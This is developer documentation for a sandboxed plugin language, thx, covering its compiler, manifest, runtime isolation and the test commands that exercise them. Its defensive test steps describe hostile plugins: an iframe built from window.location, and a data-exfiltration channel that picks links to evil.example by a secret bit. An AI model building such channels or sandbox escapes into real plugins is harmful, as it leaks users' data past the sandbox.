# Plugin language (thx)

A plugin author (the authoring agent or the implementor) writes a folder of `.thx` files; the compiler turns it into one ES module plus a derived manifest, or refuses it with errors the agent can fix in one pass; the in-page runtime runs the module so it reaches only what it was handed, renders only allowed elements and styles, and is stopped when it loops or recurses without end.

## Sub-features

- `thx-compile` compiles a plugin folder (several files, relative imports) to one `export default function (rt) { ... }` module.
- `thx-manifest` derives slot, required and optional endpoints, annotations, data schema and its hash, shell services, outside addresses and libraries from the source alone.
- `thx-errors` refuses anything outside the language with a `thx/...` code, a position, a sentence and, where there is one answer, a hint.
- `thx-verify` re-parses emitted code and refuses any module that names something it did not declare or touches anything but `rt.<member>`.
- `thx-run` runs compiled code against a host: renders, calls the SDK with plain data, gets plain data back in handlers.
- `thx-wall` keeps globals, constructors, prototypes, raw elements, built addresses and outside styles out, at build and at run time.
- `thx-budget` stops infinite loops, unbounded recursion and endless await or then chains, and tells the host.
- `thx-styles` turns `css({...})` into a scoped class whose rules the host injects.

## How to get to it (user POV)

- An implementor compiles a plugin folder against the app's real declarations: `npx thixo compile examples/todo/plugins/due-dates` (see `cli.md`). The authoring agent's `check` and `submit` (`thixo agent check|submit`, see `authoring.md`) call the same `compile`.
- A package developer compiles against the test env: `node --import tsx packages/thx/scripts/thxc.ts <folder>` (prints JSON; exit 1 with errors).
- The shell's plugin host runs a compiled module through `createRuntime(host).instantiate(module)` from `thixo-thx/runtime`.
- The package's suites drive both: `npm test` in `packages/thx`.

## Driving it with node and the thx test suites

Preconditions:

- Run from the repo root of a checkout with `npm install` done and Node 22.13 or later.
- `npm run build` in `packages/thx` exits 0.
- The fixtures `packages/thx/test/fixtures/todo-list` and `packages/thx/test/fixtures/due-dates` exist (the examples/todo plugins rewritten as thx).

- **Compile the example's plugins against the real app.** Run `npx thixo compile examples/todo/plugins/due-dates`, `…/todo-list` and `…/done-badge`. Each exits 0 with `Compiled <folder> (<name>)` and a summary; due-dates says `Annotates todo with dueOn (date).`. A plugin with `window` fails `thixo agent check` with `plugin.thx:<line>:<col>` (see `authoring.md`).
- **Run them in a browser.** The `todo-basics` journey in `todo-app.md` runs all three compiled plugins in the real runtime inside the shell, with `css()` rules scoped by the shell.
- **Compile the due-dates fixture.** Run `node --import tsx packages/thx/scripts/thxc.ts packages/thx/test/fixtures/due-dates`. Exit 0; JSON has `"ok": true`, `"verified": true`, `manifest.slot` `"todo-detail"`, `requiredEndpoints` `["getTodo"]`, `annotates` `["todo"]`, `data.stores.prefs` `[{"name":"warnDaysBefore","type":"number"}]`, `data.annotations.todo` `[{"name":"dueOn","type":"date"}]`.
- **Compile the todo list.** Run `node --import tsx packages/thx/scripts/thxc.ts packages/thx/test/fixtures/todo-list`. Exit 0; `requiredEndpoints` `["createTodo","listTodos","updateTodo"]`, `optionalEndpoints` `["deleteTodo","listAssignees"]`, data empty. These match the tables in `examples/todo/readme.md`.
- **See the emitted module.** Add `--code` to either command. `code` starts with `export default function (rt) {` and `"use strict";`, and every read and call goes through `rt.g`, `rt.m` or `rt.c`.
- **Refuse a hostile plugin.** Write a `plugin.thx` whose component returns `<iframe src={String(window.location)} />` into an empty scratch folder and run the compile command on it. Exit 1; errors include `thx/element` ("`<iframe>` is not an element a plugin can create...") and `thx/attribute`, each with `file`, `line`, `column` and a `hint`.
- **Refuse an outside link chosen by secret data.** In an empty scratch folder write a `plugin.thx` whose component reads `useQuery(listTodos)` and returns `secret ? <a href="https://evil.example/bit1">o</a> : <a href="https://evil.example/bit0">o</a>` (the red team's round-1 exfil channel), then run `node --import tsx packages/thx/scripts/thxc.ts <folder>`. Exit 1; two `thx/address` errors, "`evil.example` is not one of the hosts the app lets plugins link to.", hint naming the link hosts as `(none)`. A written-out `<a href>` compiles only when its host is in the config's `linkHosts` (CompileEnv `linkHosts`), which is separate from `addressHosts`; the escape suite's `outside link host`, `a link chosen by secret data among fixed outside addresses is refused`, `link hosts and load hosts are separate lists` and `a link host matches the host exactly` cases cover it, and `packages/core/test/compile-env.test.ts` checks the config reaches the compiler.
- **Run the plugins.** Run `cd packages/thx && node --import tsx --test test/examples.test.ts`. 5 pass: both manifests, the todo list loading todos, emitting `select` with plain `{ todoId }`, ticking, adding and deleting through the SDK, and due-dates showing "Due soon" and patching its annotation and store.
- **Try to break out.** Run `cd packages/thx && node --import tsx --test test/escape.test.ts test/guards.test.ts test/verify.test.ts`. All pass (about 270 hostile cases): every global, constructor chains by dot, computed key, destructuring, spread, JSON and optional chaining, host objects through elements, hooks, errors, promises, Dates and Maps, element and style escapes, built Urls, budget stops, and hand-written hostile output.
- **Whole package.** Run `cd packages/thx && npm test`. `# fail 0` (305 tests at the time of writing).

## Gotchas

- `scripts/thxc.ts` compiles against the test fixture env (test-double module declarations) unless given `--env <file.json>`. `thixo compile` uses the real `thixo/*` declarations core writes.
- A `.thx` source passed on the command line must be a folder with a `plugin.thx`; a single file is refused with `thx/file`.
- The package's runtime tests use a fake host (plain-object `createElement`, flat-array hooks). The browser steps use React and the shell's plugin host.
- Budget tests set `budget: 20000`; the default is 5,000,000. A stopped runtime stays stopped: create a new one to run the plugin again.
- Plugin promises that the runtime stops are marked handled; any other plugin rejection still shows as unhandled, which `node --test` counts as a failure.
